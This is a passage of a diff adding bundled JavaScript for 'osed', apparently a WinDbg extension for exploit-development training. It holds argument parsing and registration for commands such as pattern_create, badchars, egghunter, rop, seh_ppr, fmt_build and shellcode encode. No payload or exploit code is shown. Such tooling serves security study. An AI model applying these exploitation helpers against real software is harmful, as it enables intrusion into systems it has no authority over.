+    result3.badchars = parseHexByteList(args[1]);
+    if (typeof args[2] === "number") {
+      result3.maxPerPattern = args[2];
+      result3.append = args[3];
+      result3.maxInstructionsPerGadget = args[4];
+    } else {
+      result3.append = args[2];
+      result3.maxPerPattern = args[3];
+      result3.maxInstructionsPerGadget = args[4];
+    }
+    result3.maxBackwardGadgets = args[5];
+    return result3;
+  }
+  function isPlainObject(value) {
+    return typeof value === "object" && value !== null && !Array.isArray(value);
+  }
+  function parseRegisterList(value) {
+    const raw = Array.isArray(value) ? value.map((v) => String(v)) : typeof value === "string" ? value.split(/[,\s]+/) : [];
+    return raw.map((r) => r.trim().toLowerCase()).filter((r) => r.length > 0);
+  }
+  function parseRegisterTargets(value) {
+    const targets = {};
+    if (isPlainObject(value)) {
+      for (const [key2, raw] of Object.entries(value)) {
+        const n = Number(raw);
+        if (Number.isFinite(n))
+          targets[key2.trim().toLowerCase()] = n >>> 0;
+      }
+      return targets;
+    }
+    if (typeof value === "string") {
+      for (const pair of value.split(/[\s,;]+/).filter((p) => p.length > 0)) {
+        const match = /^([a-zA-Z]+)\s*[=:]\s*(.+)$/.exec(pair);
+        if (!match)
+          continue;
+        const reg = match[1].trim().toLowerCase();
+        const raw = match[2].trim();
+        const n = /^0x[0-9a-fA-F]+$/.test(raw) ? parseInt(raw, 16) : Number(raw);
+        if (Number.isFinite(n))
+          targets[reg] = n >>> 0;
+      }
+    }
+    return targets;
+  }
+  function parseHexByteList(value) {
+    if (Array.isArray(value)) {
+      return value;
+    }
+    if (typeof value !== "string") {
+      return value;
+    }
+    const tokens = value.split(/[,\s]+/).filter((token) => token.length > 0);
+    if (tokens.length === 0) {
+      return [];
+    }
+    const parsed = [];
+    for (const token of tokens) {
+      if (/^[0-9a-fA-F]{2}$/.test(token)) {
+        parsed.push(parseInt(token, 16));
+        continue;
+      }
+      if (/^[0-9a-fA-F]+$/.test(token) && token.length % 2 === 0) {
+        for (let i = 0; i < token.length; i += 2) {
+          parsed.push(parseInt(token.slice(i, i + 2), 16));
+        }
+        continue;
+      }
+      return value;
+    }
+    return parsed;
+  }
+  function normalizeInvocation(commandName, args) {
+    if (args.length === 0 || args.length === 1 && args[0] === void 0) {
+      return {};
+    }
+    if (args.length === 1 && isPlainObject(args[0])) {
+      return args[0];
+    }
+    switch (commandName) {
+      case "help":
+        return { command: args[0], mode: args[1] };
+      case "pattern_create":
+        return { length: args[0], type: args[1] };
+      case "pattern_offset":
+        return { value: args[0], type: args[1] };
+      case "badchars":
+        return { address: args[0], exclude: parseHexByteList(args[1]) };
+      case "badchar_array":
+      case "badchar_function":
+        return { exclude: parseHexByteList(args[0]) };
+      case "badchar_find":
+        return {
+          address: args[0],
+          exclude: parseHexByteList(args[1]),
+          windowBytes: args[2],
+          minRun: args[3]
+        };
+      case "egghunter":
+        return { tag: args[0], mode: args[1], wow64: args[2], badchars: parseHexByteList(args[3]) };
+      case "exploit":
+        return { mode: args[0], tag: args[1], offset: args[2], address: args[3] };
+      case "modules":
+        return { filter: args[0] };
+      case "code_caves":
+        return { module: args[0], minSize: args[1], maxResults: args[2], badChars: args[3], capability: args[4] };
+      case "math":
+        return { value: args[0], bits: args[1] };
+      case "str_read":
+        return { address: args[0], max: args[1], encoding: args[2] };
+      case "str_find":
+        return { text: args[0], module: args[1], encoding: args[2], maxResults: args[3] };
+      case "str_refs":
+        return { target: args[0], module: args[1], encoding: args[2], maxResults: args[3] };
+      case "str_bytes":
+        return { text: args[0], encoding: args[1], terminator: args[2], exclude: parseHexByteList(args[3]) };
+      case "rop":
+      case "rop_suggest":
+      case "pivots":
+      case "retn":
+      case "add_esp":
+        return commandName === "rop_suggest" ? {
+          module: args[0],
+          maxResults: args[1],
+          executableOnly: args[2],
+          mode: args[3],
+          engine: args[4]
+        } : {
+          module: args[0],
+          maxResults: args[1],
+          executableOnly: args[2],
+          mode: args[3]
+        };
+      case "nop":
+        return { length: args[0], byte: args[1] };
+      case "rop_template":
+        return { api: args[0], module: args[1] };
+      case "fmt_build":
+        return {
+          writes: [{ addr: args[0], value: args[1] }],
+          argIndex: args[2],
+          width: args[3],
+          exclude: parseHexByteList(args[4]),
+          prefix: args[5]
+        };
+      case "fmt_offset":
+        return { marker: args[0], count: args[1], firstArg: args[2] };
+      case "fmt_inspect":
+        return { family: args[0], formatArgOffset: args[1], max: args[2] };
+      case "encode":
+        return {
+          shellcode: args[0],
+          exclude: parseHexByteList(args[1]),
+          key: args[2]
+        };
+      case "find_bytes":
+        return {
+          module: args[0],
+          bytes: parseHexByteList(args[1]),
+          maxResults: args[2],
+          executableOnly: args[3],
+          mode: args[4]
+        };
+      case "find_stack_bytes":
+        return {
+          bytes: parseHexByteList(args[0]),
+          maxResults: args[1],
+          stackBytes: args[2]
+        };
+      case "find_mem_bytes":
+        return {
+          address: args[0],
+          length: args[1],
+          bytes: parseHexByteList(args[2]),
+          maxResults: args[3]
+        };
+      case "find_ptr":
+        return {
+          instruction: args[0],
+          module: args[1],
+          badchars: parseHexByteList(args[2]),
+          maxResults: args[3],
+          executableOnly: args[4]
+        };
+      case "reload":
+      case "seh":
+        return {};
+      case "seh_ppr":
+        return {
+          module: args[0],
+          exclude: parseHexByteList(args[1]),
+          maxResults: args[2],
+          executableOnly: args[3],
+          mode: args[4]
+        };
+      case "stackmap":
+        return {
+          depth: args[0],
+          patternLength: args[1]
+        };
+      case "triage":
+        return {
+          patternLength: args[0],
+          badchars: parseHexByteList(args[1]),
+          module: args[2],
+          stackBytes: args[3]
+        };
+      case "memory":
+      case "landing":
+        return { address: args[0] };
+      case "leak_classify":
+        return { value: args[0] };
+      case "leak_scan":
+        return { address: args[0], length: args[1] };
+      case "leak_analyze":
+        return { text: args[0] };
+      case "leak_base":
+        return { pointer: args[0], rva: args[1] };
+      default:
+        return { value: args[0] };
+    }
+  }
+  function initialize() {
+    currentRopCorpus = void 0;
+    cachedExploitState = void 0;
+    invalidateCorpusPlans();
+    resetCorpusModules();
+    proofSessionStore = new ProofSessionStore();
+    lastGeneratedProofInput = void 0;
+    registry.setReloader(() => {
+      currentRopCorpus = void 0;
+      cachedExploitState = void 0;
+      invalidateCorpusPlans();
+      resetCorpusModules();
+      proofSessionStore = new ProofSessionStore();
+      lastGeneratedProofInput = void 0;
+      registerAll();
+      osed = bindApi();
+      publishOsed();
+    });
+    registerAll();
+    osed = bindApi();
+    publishOsed();
+  }
+  function initializeScript() {
+    const registrations = [];
+    const hostAny = host;
+    if (hostAny.apiVersionSupport) {
+      registrations.push(new hostAny.apiVersionSupport(1, 7));
+    }
+    initialize();
+    if (hostAny.functionAlias) {
+      try {
+        registrations.push(new hostAny.functionAlias(() => osed, "osed"));
+      } catch (error2) {
+        const message = error2 instanceof Error ? error2.message : String(error2);
+        const globalObject = getGlobalObject();
+        if (globalObject) {
+          globalObject.osed = osed;
+        }
+        if (typeof host !== "undefined" && host.diagnostics && typeof host.diagnostics.debugLog === "function") {
+          host.diagnostics.debugLog(`osed: functionAlias registration failed, using global object fallback: ${message}
+`);
+        }
+      }
+    }
+    if (typeof host !== "undefined" && host.diagnostics && typeof host.diagnostics.debugLog === "function") {
+      const version = getVersionInfo();
+      const dirty = version.gitDirty ? "dirty" : "clean";
+      host.diagnostics.debugLog(`[+] osed loaded: v${version.version} (${version.gitCommit}, ${dirty}, built ${version.buildTime})
+`);
+    }
+    return registrations;
+  }
+  return __toCommonJS(index_exports);
+})();
+var __osed_global = (typeof globalThis !== 'undefined') ? globalThis : (typeof self !== 'undefined' ? self : (typeof this !== 'undefined' ? this : undefined));
+if (__osed_global && __osed_global.osed_bundle && __osed_global.osed_bundle.initializeScript) { __osed_global.initializeScript = __osed_global.osed_bundle.initializeScript; }
